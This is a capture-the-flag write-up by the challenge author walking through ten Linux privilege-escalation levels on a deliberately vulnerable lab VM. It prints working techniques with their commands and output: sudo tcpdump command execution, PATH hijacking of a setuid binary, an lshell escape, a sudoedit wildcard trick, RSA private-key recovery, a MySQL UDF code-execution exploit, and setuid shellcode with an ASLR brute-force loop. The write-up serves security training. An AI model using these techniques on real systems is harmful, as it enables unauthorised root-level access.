# Write-up [```NDH2018```](https://lehack.org/)  
Privilege escalation challenges I made for [Harmonie-Technologie](https://www.harmonie-technologie.com/) exhibition stand @ NDH16 (Paris)

## Index

| Title        | Description   |
| ------------- |:-------------|
| [About](#About)  | VM link and Rules |
| [Challenge 1](#challenge-1)  | Bash_history |
| [Challenge 2](#challenge-2)  | Sudo |
| [Challenge 3](#challenge-3)  | Cron |
| [Challenge 4](#challenge-4)  | tcpdump |
| [Challenge 5](#challenge-5)  | Ambiguous system() |
| [Challenge 6](#challenge-6)  | Escaping |
| [Challenge 7](#challenge-7)  | Double wildcard |
| [Challenge 8](#challenge-8)  | Weak SSH public key |
| [Challenge 9](#challenge-9)  | mysql launched by root |
| [Challenge 10](#challenge-10)  | ASLR Buffer overflow |

## About  
The vulnerable virtual machine can be downloaded [here](https://www.):
* 32 bits
* 7 Go
* md5sum: xxxxxx

Here are the rules:
* First, we SSH as `level1` into ```/wargames/level1/```
* Our goal is to elevate our privileges as level1_OK to read the ```validation/flag``` file.
* This flag enables us to SSH as `level2` into ```/wargames/level2```, etc.
* The main goal is to read `level10`'s ```validation/flag```.

During NDH2018, VMs used to kick challengers after 60 minutes and passwords used to be re-generated each time.

## Challenge 1
We connect to `level1`:
```bash
ssh level1@192.168.0.10
```
We spawn into ```/wargames/level1/```. Let's see what we have:
```bash
level1@harmonie-technologie:~$ ls -la
total 20
dr-xr-x---  3 level1    level1    4096 Jun 13 10:38 .
dr-xr-xr-x 12 root      root      4096 May 28 07:03 ..
-r--r-----  1 level1    level1     128 Jun 13 10:10 .bash_history
-r--r-----  1 level1    level1     595 Jun 13 10:24 indices
dr-x------  2 level1_OK level1_OK 4096 May 22 08:36 validation
```
`.bash_history` looks not empty. Let's cat it.
```bash
level1@harmonie-technologie:~$ cat .bash_history 
ls
ls validation
cd validation
cd ..
cd level1/validation
cd level1
suu level1_OK
725fc84ebb57658e0851476ff0dbf48c
su level1_OK 
```
>level1_OK:725fc84ebb57658e0851476ff0dbf48c

It seems that `level1_OK` tried to su, but due to keying error, he typed his password when not asked. His password is now saved into `.bash_history` like all commands he types. Armed with this password, we can SSH as `level1_OK` and cat the flag:
```bash
level1_OK@harmonie-technologie:~$ ls -la
total 12
dr-x------ 2 level1_OK level1_OK 4096 May 22 08:36 .
dr-xr-x--- 3 level1    level1    4096 Jun 13 10:38 ..
-r-------- 1 level1_OK level1_OK   73 Jun 13 09:53 flag
level1_OK@harmonie-technologie:~$ cat flag 
Identifiants SSH :
login : level2
mdp : 9a8589dac2fdf54ffb9aed5bbd3d40f5 
```
>level2:9a8589dac2fdf54ffb9aed5bbd3d40f5

## Challenge 2
We connect as `level2` with the hash previously found. We can check `sudo -l` to see that we can execute a command as `level2_OK`.
```bash
level2@harmonie-technologie:~$ sudo -l
Matching Defaults entries for level2 on harmonie-technologie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    sudoedit_follow

User level2 may run the following commands on harmonie-technologie:
    (level2_OK) NOPASSWD: /bin/bash
```
We are allowed to spawn a bash shell as `level2_OK`. Let's do this, and let's read our flag ! :
```bash
level2@harmonie-technologie:~$ sudo -u level2_OK /bin/bash
level2_OK@harmonie-technologie:/wargames/level2$ cat validation/flag 
Identifiants SSH :
login : level3
mdp : ec3ae40face0433f0a8333396d73f17a
```
>level3:ec3ae40face0433f0a8333396d73f17a

## Challenge 3
We can see a `script.sh` file in out directory with `ls` command.
```bash
level3@harmonie-technologie:~$ ls -la
total 20
dr-xr-x---  3 level3    level3    4096 Jun 13 10:37 .
dr-xr-xr-x 12 root      root      4096 May 28 07:03 ..
-r--r-----  1 level3    level3      20 Jun 13 10:37 indices
-r-xrwx---  1 level3_OK level3      60 May 29 16:28 script.sh
dr-x------  2 level3_OK level3_OK 4096 May 29 07:27 validation
```
This script is owned by `level3_OK`. Let's see what is the purpose of this file by cating it
```bash
level3@harmonie-technologie:~$ cat script.sh
#!/bin/sh
# Free Disk Space Script

df -h > /tmp/free 2>&1
```
Okay, it seems to write output of `df` command into `/tmp/free`. We execute `ls` on this file and see that the file is also owned by `level3_OK`.
```bash
level3@harmonie-technologie:~$ ls -l /tmp/free 
-r--r----- 1 level3_OK level3_OK 323 Jul  4 14:29 /tmp/free
```
We assume this file was created by our script.sh. Is there any chance that our `script.sh` is executed periodically, with cron ? With stat command, we see the file is created each 20 seconds.
```bash
level3@harmonie-technologie:~$ stat /tmp/free 
  File: /tmp/free
  Size: 323       	Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d	Inode: 655852      Links: 1
Access: (0440/-r--r-----)  Uid: ( 1013/level3_OK)   Gid: ( 1013/level3_OK)
Access: 2018-07-04 14:29:01.627999685 -0500
Modify: 2018-07-04 14:29:01.639999685 -0500
Change: 2018-07-04 14:59:41.983335199 -0500
 Birth: -
 ```
 So our assumption is probably true. Let's edit our `script.sh` to copy the flag into `/tmp/`
 ```bash
 level3@harmonie-technologie:~$ echo 'cp /wargames/level3/validation/flag /tmp/flag ; chmod 777 /tmp/flag' >> /wargames/level3/script.sh
 ```
 We can see that `/tmp/flag` is then created, with our flag in it
 ```bash
 level3@harmonie-technologie:~$ cat /tmp/flag 
Identifiants SSH :
login : level4
mdp : 1dff8183db0c37844e7a3cb00787ed1d
```
>level4:1dff8183db0c37844e7a3cb00787ed1d
 
## Challenge 4
First, we `sudo -l` to see that we are allowed to execute `tcpdump` as `level4_OK`.
```bash
level4@harmonie-technologie:~$ sudo -l
Matching Defaults entries for level4 on harmonie-technologie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    sudoedit_follow

User level4 may run the following commands on harmonie-technologie:
    (level4_OK) NOPASSWD: /usr/sbin/tcpdump
```
If we could find a way `tcpdump` to execute a command or a script, it will be done as `level4_OK`. Fortunately for us, we can find [this](https://www.stevencampbell.info/2016/04/why-sudo-tcpdump-is-dangerous/) page showing us how to do such a thing. First, we create a script to execute
```bash
level4@harmonie-technologie:~$ echo "cat /wargames/level4/validation/flag" > /tmp/script.sh
level4@harmonie-technologie:~$ chmod +x /tmp/script.sh
```
Then, let's do crazy things with `tcpdump` options to execute our `script.sh` !
```bash
level4@harmonie-technologie:~$ sudo -u level4_OK /usr/sbin/tcpdump -ln -i ens32 -w /dev/null -W 1 -G 1 -z /tmp/script.sh
tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
9 packets received by filter
0 packets dropped by kernel
level4@harmonie-technologie:~$ Identifiants SSH :
login : level5
mdp : 6849269f685dbfca052e87ae24119305
```
>level5:6849269f685dbfca052e87ae24119305
 
## Challenge 5
First, we `ls`. We can see a binary `level5` with setuid bit on
```
level5@harmonie-technologie:~$ ls -la
total 28
dr-xr-x---  3 level5    level5    4096 Jun 13 10:50 .
dr-xr-xr-x 12 root      root      4096 May 28 07:03 ..
-r--r-----  1 level5    level5      63 Jun 13 10:37 indices
-r-sr-x---  1 level5_OK level5    7652 May 22 08:36 level5
-r--r-----  1 level5    level5      70 Jun 13 10:50 level5.c
dr-x------  2 level5_OK level5_OK 4096 May 22 08:36 validation
```
It means that when we execute `level5`, it will be done as `level5_OK`. So if we could find a way to make our `level5` binary execute commands for us, we win ! Let's see the `level5.c` (source code)
```
level5@harmonie-technologie:~$ cat level5.c 
# Brouillon
#include <stdio.h>

void main()
{
  system("ls -lah ");
}
```
There is not a lot of things. We just have a `system` function executing a bash command. The problem here is that our `ls` command is ambiguous. Indeed, how does our `system` function know where is located our `ls` command ? It simply browses our `$PATH` variable and check if ls is available in each directory from left to right.
```bash
level5@harmonie-technologie:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
With this `$PATH`, `system()` will be looking for ls binary into `/usr/local/bin` first, then into `/usr/bin`, etc. So, let's imagine we create a fake `ls` binary into `/tmp/` and fool `system()` function by editing our `$PATH` variable to point to our fake `ls` binary ?
```bash
level5@harmonie-technologie:~$ echo "/bin/sh" >> /tmp/ls
level5@harmonie-technologie:~$ chmod +x /tmp/ls
level5@harmonie-technologie:~$ cd /tmp/ ; touch a
level5@harmonie-technologie:/tmp$ export PATH=/tmp:$PATH
```
Let's execute our `level5` binary 
```bash
level5@harmonie-technologie:/tmp$ /wargames/level5/level5 a

---------------------------------
- HARMONIE-TECHNOLOGIE PRESENTS -
---------------------------------

$ whoami
level5_OK
$ cat /wargames/level5/validation/flag
Identifiants SSH
login : level6
mdp : dd37daab8527108ecef8c8d8da901dd4
```
>level6:dd37daab8527108ecef8c8d8da901dd4
 
## Challenge 6
We try to SSH as `level6` but we come face to face with that. Wtf ?
![Fishes](https://image.noelshack.com/fichiers/2018/27/3/1530736493-capture-d-ecran-2018-07-04-a-22-32-22.png)
We can try to find keys to stop this (good luck). Or... you can think. This pops up when we SSH with correct logins. We can assume that script is launched with `.bash_profile`
```bash
ssh level6@192.168.1.186 -t "/bin/bash"
level6@192.168.1.186's password: 
level6@harmonie-technologie:~$
```
We see with `sudo -l` we can execute a binary named `1up`
```bash
level6@harmonie-technologie:~$ sudo -l
Matching Defaults entries for level6 on harmonie-technologie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    sudoedit_follow

User level6 may run the following commands on harmonie-technologie:
    (level6_OK) NOPASSWD: /usr/bin/1up
```
`1up` is executed as `level6_OK`. Let's go.
```bash
level6@harmonie-technologie:~$ sudo -u level6_OK /usr/bin/1up 
== Harmonie-Technologie ==
Welcome to a restricted shell
Type '?' or 'help' to get the list of allowed commands
level6_OK:~$ help
cd     date  exit  history  lpath  lsudo  whereis
clear  echo  help  id       ls     pwd    whoami 
```
Now we are `level6_OK`, but into a limited shell. We can't do lot of things... The hint in home directory tells us that this is `lshell`. After some reasearches, we found into github issues of the project [a way to escape](https://image.noelshack.com/fichiers/2018/27/3/1530738563-capture-d-ecran-2018-07-04-a-23-08-30.png) lshell.
```bash
level6_OK:~$ echo FREEDOM! && cd () bash && cd
FREEDOM!
level6_OK@harmonie-technologie:~$ cat flag
Identifiants SSH :
login : level7
mdp : ed157267bb12163a0aff440a30465565
```
>level7:ed157267bb12163a0aff440a30465565
 
## Challenge 7
We can see with `sudo -l` we are allowed to sudoedit as `level7_OK`.
```bash
level7@harmonie-technologie:~$ sudo -l
Matching Defaults entries for level7 on harmonie-technologie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    sudoedit_follow

User level7 may run the following commands on harmonie-technologie:
    (level7_OK) NOPASSWD: sudoedit /wargames/level7/*/*/hello.html
```
The double wildcard catches our attention. We look for a privilege escalation exploit on internet and find [this](https://www.exploit-db.com/exploits/37710/). But, we are not allowed to create files in these directories. But there is a way to fool our `sudoedit`.
```bash
sudoedit -u level7_OK /wargames/level7/ validation/flag /hello.html
```
It modifies out `validation/flag` as `level7_OK` and we can see the flag
```bash
GNU nano 2.7.4             File: /var/tmp/flag.XXarylty                       

Identifiants SSH :
login : level8
mdp : 838e7b5fe545215c7d057d1e546d1192
```
>level8:838e7b5fe545215c7d057d1e546d1192
 
## Challenge 8
First, we see a `level8_OK.pub`, which is a public key.
```
level8@harmonie-technologie:~$ ls -la
total 16
dr-xr-x---  3 level8    level8    4096 Jun 13 09:13 .
dr-xr-xr-x 12 root      root      4096 May 28 07:03 ..
-r--r-----  1 level8_OK level8     452 Jun 13 09:13 level8_OK.pub
dr-x------  3 level8_OK level8_OK 4096 May 29 14:07 validation

level8@harmonie-technologie:~$ cat level8_OK.pub 
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQJEOdD3xMZXXa6KlK5TkdGp
Xks6KsSAvEhOEVu5f2CpF6PbXOHQbn8RFF852PDuqDsAuL+FhMfTyUHy8QtYe5AX
m48Dj9Huf3uDRoTgQ8kzbQ/lJRY9o+XveRSLXliobpO/03mrGVJ6GQg+kXoUp6JF
v9upT0xP7tX/ZHatsca0vwKBgQIUKNuaGhnRSwphFCHpTdjR/Qn4maTnPr6Mefgc
XMwAMl51wNgda1z68WQvZUypv0lzUwel6EnmNAg5Jxtgu2VBIyZw8yL+RZ0S/QhQ
838fTH68XJ4Wnr5M3Xp1/PlTbw+Uyuj1pG6tU5W0b7LTMHsiP1mo+KKWAmBW5js1
WJuEMw==
-----END PUBLIC KEY-----
```
We look for a way to retrieve private key from public key and find `RSACtfTool`
```bash
mbp:~ aas$:/opt/RsaCtfTool# python2.7 ./RsaCtfTool.py --publickey ./level8_OK.pub --private
-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQJEOdD3xMZXXa6KlK5TkdGpXks6KsSAvEhOEVu5f2CpF6PbXOHQ
bn8RFF852PDuqDsAuL+FhMfTyUHy8QtYe5AXm48Dj9Huf3uDRoTgQ8kzbQ/lJRY9
o+XveRSLXliobpO/03mrGVJ6GQg+kXoUp6JFv9upT0xP7tX/ZHatsca0vwKBgQIU
KNuaGhnRSwphFCHpTdjR/Qn4maTnPr6MefgcXMwAMl51wNgda1z68WQvZUypv0lz
Uwel6EnmNAg5Jxtgu2VBIyZw8yL+RZ0S/QhQ838fTH68XJ4Wnr5M3Xp1/PlTbw+U
yuj1pG6tU5W0b7LTMHsiP1mo+KKWAmBW5js1WJuEMwIgRcnVWAD+e2g5P7EkY6PZ
z84C0lkNl6trJOS8W28jv5sCQQEyAyR+3b2K13m7XwIZrBZyGRP19A3kLg+mcDEs
vBnCzNS8Vs9it2oQ62GE9HBAl7qMdxPLjjTApWRKEvdO6SRPAkEB5WXyQiDkaUsG
2m6x5yRXf/La+o61TIp0VAzKPqhy8C5WZL/MIddBY8CJkAXjN1VjHtTu54xXLyAl
L/AAjZeckQIgRcnVWAD+e2g5P7EkY6PZz84C0lkNl6trJOS8W28jv5sCIEXJ1VgA
/ntoOT+xJGOj2c/OAtJZDZerayTkvFtvI7+bAkBKy2kr6DNEuU85q/XKADVY42nn
tUfGDfFTxSpHPBbyIzaFAWznIPnD6AbfYbagjs/Mn25Wxzb6D6TORbijBID2
-----END RSA PRIVATE KEY-----
```
Now, what remains to be done is to SSH as `level8_OK` with the retrieved private key
```bash
mbp:~ aas$ chmod 600 level8_OK.priv 
mbp:~ aas$ ssh -i level8_OK.priv level8_OK@192.168.1.186
Linux harmonie-technologie 4.9.0-6-686-pae #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
level8_OK@harmonie-technologie:~$ cat flag 
Identifiants SSH :
login : level9
mdp : b9581507cf0b6d50f0e49e784b2e7a1a
```
>level9:b9581507cf0b6d50f0e49e784b2e7a1a
 
## Challenge 9
We see we can launch `mysql` here.
```bash
level9@harmonie-technologie:~$ ls -la
total 16
dr-xr-x---  3 level9    level9    4096 Jun  4 17:08 .
dr-xr-xr-x 12 root      root      4096 May 28 07:03 ..
-r--r-----  1 level9    level9      50 Jun  4 17:08 .my.cnf
lrwxrwxrwx  1 root      root        26 Jun  4 15:26 mysql -> /usr/local/mysql/bin/mysql
dr-x------  2 level9_OK level9_OK 4096 May 22 08:36 validation
```
With `ps` command, we see `mysql` is started as `level9_OK`, and we have `basedir`, `datadir` and `plugin-dir`
```bash
level9@harmonie-technologie:~$ ps -aux | grep mysql
...
level9_+   [...] /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=level9_OK [...]
...
```
We want to make `mysql` execute commands for us. We heard about UDF. We found [this](https://github.com/ankh2054/MySQL-UDF/blob/master/raptor_udf2.c) old exploit. Let's download our exploit
```bash
level9@harmonie-technologie:~$ cd /tmp/
level9@harmonie-technologie:/tmp$ wget https://raw.githubusercontent.com/ankh2054/MySQL-UDF/master/raptor_udf2.c
[...]
Saving to: ‘raptor_udf2.c’
raptor_udf2.c                100%[============================================>]   2.59K  --.-KB/s    in 0s      
2018-07-04 16:42:25 (39.6 MB/s) - ‘raptor_udf2.c’ saved [2654/2654]
```
We compile our source code, and we execute `mysql`
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
cd ; ./mysql
```
We execute these `mysql` commands
```bash
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
```
We use our `plugin-dir` enumerated with `ps` command. Then we create our `do_system` function to execute commands
```bash
mysql> select * from foo into dumpfile '/usr/local/mysql/lib/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
```
All we have to do now is to execute a command to read our flag
```bash
mysql> select do_system('cp /wargames/level9/validation/flag /tmp/lev9 ; chmod 777 /tmp/lev9');
mysql> exit;
Bye
level9@harmonie-technologie:~$ cat /tmp/lev9 
Identifiants SSH :
login : levelfinal
mdp : 181b70c897ddd4a4673d5794206379b7
```
>levelfinal:181b70c897ddd4a4673d5794206379b7
 
## Challenge 10
A `ls` let us know we have a `levelfinal` binary with setuid bit. Again, it means it is executed as `levelfinal_OK`.
```bash
levelfinal@harmonie-technologie:~$ ls -la
total 32
dr-xr-x---  3 levelfinal    levelfinal    4096 Jun 13 10:36 .
dr-xr-xr-x 12 root          root          4096 May 28 07:03 ..
---x------  1 levelfinal    levelfinal    7508 May 22 09:05 getEnvAddress
-r--r-----  1 levelfinal    levelfinal     182 Jun 13 10:36 indices
-r-sr-x---  1 levelfinal_OK levelfinal    7556 May 22 08:36 levelfinal
dr-x------  2 levelfinal_OK levelfinal_OK 4096 May 22 08:36 validation
```
We try to execute our binary file
```bash
levelfinal@harmonie-technologie:~$ ./levelfinal aas
Hello aas! You can't hack me...
```
We use strings on the binary and see that strcpy function is used
```bash
levelfinal@harmonie-technologie:~$ strings levelfinal 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
strcpy
exit
puts
```
Is it possible the binary is vulnerable to buffer overflow ? Let's try to send lot of A.
```bash
levelfinal@harmonie-technologie:~$ ./levelfinal `python -c "print 'A'*100"`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! You can't hack me...
Segmentation fault
```
Segfault, nice. We probably have overwritten `EIP` register (next instruction to be executed). We now use `dbg` to disassemble functions and make sure `strcpy` is indeed used in `vuln` function.
```bash
levelfinal@harmonie-technologie:~$ gdb ./levelfinal -q
(gdb) disas main
Dump of assembler code for function main:
   [...] 
   0x0000069c <+64>:	add    $0x4,%eax
   0x0000069f <+67>:	mov    (%eax),%eax
   0x000006a1 <+69>:	sub    $0xc,%esp
   0x000006a4 <+72>:	push   %eax
   0x000006a5 <+73>:	call   0x620 <vuln>
   0x000006aa <+78>:	add    $0x10,%esp
   0x000006ad <+81>:	mov    $0x0,%eax
   0x000006b2 <+86>:	lea    -0x8(%ebp),%esp
   [...]
   
(gdb) disas vuln
Dump of assembler code for function vuln:
   [...]
   0x0000063b <+27>:	push   %eax
   0x0000063c <+28>:	call   0x460 <strcpy@plt>
   0x00000641 <+33>:	add    $0x10,%esp
   [...]
```
Here, we want to find offset to overwrite `EIP`. To that purpose we use pattern-create
```bash
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
levelfinal@harmonie-technologie:~$ gdb ./levelfinal -q
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Program received signal SIGSEGV, Segmentation fault.
0x41386141 in ?? ()
```
We then use `pattern_offset` to retrieve offset
```bash
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41386141
[*] Exact match at offset 24
```
After 24 letters, we overwrite `EIP` register. Next we want to store our shellcode in memory. One way to achieve that purpose is to put it in environment variable. We put few NOPs instructions before our shellcode to give us latitude when our program will need our shellcode. 
```bash
export SC=$(python -c 'print "\x90"*30000 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
```
We retrieve our shellcode address
```bash
levelfinal@harmonie-technologie:~$ ./getEnvAddress SC
SC is located at 0xbfd2fa0f
```
We gather all these informations and write the following command
```bash
./levelfinal `python -c "print 'A'*24 + '\x13\x7e\xd6\xbf'"`
```
This probably works without ASLR protection. But here, it is enabled. But we are on a 32 bits machine, and we can simply bruteforce it... To that purpose, let's add some bash around our python command.
```bash
levelfinal@harmonie-technologie:~$ for i in {1..66000}; do echo number of tries: $i && ./levelfinal `python -c "print 'A'*24 + '\x15\xfa\xd2\xbf'"`&& break;echo Exploit failed;done;
```
![](https://thumbs.gfycat.com/MiniatureThinAmericanbulldog-size_restricted.gif)
>00fa43a89878a45deaad751f4a7c23d2

## The end  
Thanks for reading this.  
I hope you enjoyed it as much as I enjoyed making these challenges.  
# 
*Created by [Lyderic 'aas' Lefebvre](https://www.linkedin.com/in/lydericlefebvre/)*
